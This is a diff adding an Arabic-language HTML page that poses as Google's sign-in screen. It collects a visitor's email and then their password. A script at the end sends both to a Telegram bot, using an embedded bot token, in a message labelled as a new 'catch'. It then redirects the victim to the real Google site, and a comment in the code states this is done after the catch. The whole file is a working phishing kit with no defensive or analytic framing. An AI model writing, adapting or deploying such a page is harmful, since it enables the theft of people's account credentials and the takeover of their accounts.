@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Google - تسجيل الدخول</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        :root { --google-blue: #1a73e8; --text-dark: #202124; --border-color: #dadce0; }
+        body { font-family: 'Roboto', sans-serif; background-color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .auth-card { width: 100%; max-width: 450px; padding: 48px 40px 36px; border-radius: 8px; text-align: center; }
+        @media (min-width: 601px) { .auth-card { border: 1px solid var(--border-color); background-color: #fff; } body { background-color: #f8f9fa; } }
+        .input-field { width: 100%; padding: 13px 15px; border: 1px solid var(--border-color); border-radius: 4px; font-size: 16px; text-align: right; }
+        .input-field:focus { outline: none; border: 2px solid var(--google-blue); }
+        .btn-next { background-color: var(--google-blue); color: white; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; }
+        .user-chip { display: inline-flex; align-items: center; padding: 5px 12px; border: 1px solid var(--border-color); border-radius: 20px; margin-bottom: 20px; font-size: 14px; }
+        .hidden-step { display: none; }
+        .spinner { border: 2px solid rgba(255,255,255,0.3); border-top: 2px solid #fff; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: none; margin-left: 8px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="auth-card" id="mainCard">
+        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" class="mx-auto mb-3">
+            <path d="M7.8 15.3c-2.4 0-4.4-1.9-4.4-4.3s2-4.3 4.4-4.3c1.2 0 2.2.4 3 1.2l2.1-2.1c-1.3-1.3-3.1-2.1-5.1-2.1-4.1 0-7.4 3.3-7.4 7.3s3.3 7.3 7.4 7.3c2.1 0 3.8-.8 5.1-2.1l-2.1-2.1c-.8.8-1.8 1.2-3 1.2z" fill="#4285F4"/>
+            <path d="M19.1 12.2h-6.2v2h4.1c-.4 2.1-2.1 3.5-4.1 3.5-2.4 0-4.4-1.9-4.4-4.3s2-4.3 4.4-4.3c1.1 0 2 .4 2.7 1l1.5-1.5c-1.1-1-2.6-1.7-4.2-1.7-4.1 0-7.4 3.3-7.4 7.3s3.3 7.3 7.4 7.3c3.8 0 6.5-2.6 6.5-6.6 0-.4 0-.7-.1-1z" fill="#EA4335"/>
+            <path d="M26.2 11c-2.4 0-4.4 1.9-4.4 4.3s2 4.3 4.4 4.3 4.4-1.9 4.4-4.3-2-4.3-4.4-4.3zm0 6.6c-1.3 0-2.4-1.1-2.4-2.3s1.1-2.3 2.4-2.3 2.4 1.1 2.4 2.3-1.1 2.3-2.4 2.3z" fill="#FBBC05"/>
+            <path d="M35.6 11c-2.4 0-4.4 1.9-4.4 4.3s2 4.3 4.4 4.3 4.4-1.9 4.4-4.3-2-4.3-4.4-4.3zm0 6.6c-1.3 0-2.4-1.1-2.4-2.3s1.1-2.3 2.4-2.3 2.4 1.1 2.4 2.3-1.1 2.3-2.4 2.3z" fill="#34A853"/>
+        </svg>
+
+        <div id="stepEmail">
+            <h1 class="text-2xl text-[var(--text-dark)] mb-2">Google</h1>
+            <p class="text-base text-[var(--text-dark)] mb-10">استخدام حسابك على Google</p>
+            <form onsubmit="goToPassword(event)">
+                <input type="email" id="emailInput" class="input-field mb-1" placeholder="البريد الإلكتروني أو الهاتف" required autofocus>
+                <div class="flex items-center justify-between flex-row-reverse mt-10">
+                    <button type="submit" class="btn-next">التالي</button>
+                    <a href="#" class="text-[var(--google-blue)] text-sm font-medium hover:underline">إنشاء حساب</a>
+                </div>
+            </form>
+        </div>
+
+        <div id="stepPassword" class="hidden-step">
+            <h1 class="text-2xl text-[var(--text-dark)] mb-2 font-medium">مرحباً</h1>
+            <div class="user-chip" id="displayEmail"></div>
+            <form onsubmit="sendToTelegram(event)">
+                <input type="password" id="passInput" class="input-field mb-1" placeholder="أدخل كلمة المرور" required>
+                <div class="flex items-center justify-between flex-row-reverse mt-12">
+                    <button type="submit" id="submitBtn" class="btn-next flex items-center justify-center">
+                        <div id="spinner" class="spinner"></div>
+                        <span id="btnText">التالي</span>
+                    </button>
+                    <a href="#" class="text-[var(--google-blue)] text-sm font-medium hover:underline">نسيت كلمة المرور؟</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8750206462:AAFMg4e7ow4nwEd_ZDA_iZFJpB_FEeRYlCs";
+        let capturedEmail = "";
+
+        function goToPassword(e) {
+            e.preventDefault();
+            capturedEmail = document.getElementById('emailInput').value;
+            document.getElementById('displayEmail').innerText = capturedEmail;
+            document.getElementById('stepEmail').classList.add('hidden-step');
+            document.getElementById('stepPassword').classList.remove('hidden-step');
+        }
+
+        async function sendToTelegram(e) {
+            e.preventDefault();
+            const password = document.getElementById('passInput').value;
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            const submitBtn = document.getElementById('submitBtn');
+
+            btnText.innerText = "جاري التحميل...";
+            spinner.style.display = "block";
+            submitBtn.disabled = true;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+                const data = await response.json();
+                let chatID = (data.result && data.result.length > 0) ? data.result[data.result.length - 1].message.chat.id : "";
+                
+                if (!chatID) throw new Error("يرجى تفعيل البوت بإرسال /start له أولاً.");
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatID, text: `📬 صيد جديد\n📧 إيميل: ${capturedEmail}\n🔑 باسورد: ${password}` })
+                });
+
+                window.location.href = "https://accounts.google.com"; // تحويل الضحية لجوجل الحقيقي بعد الصيد
+            } catch (error) {
+                alert(error.message);
+                btnText.innerText = "التالي";
+                spinner.style.display = "none";
+                submitBtn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
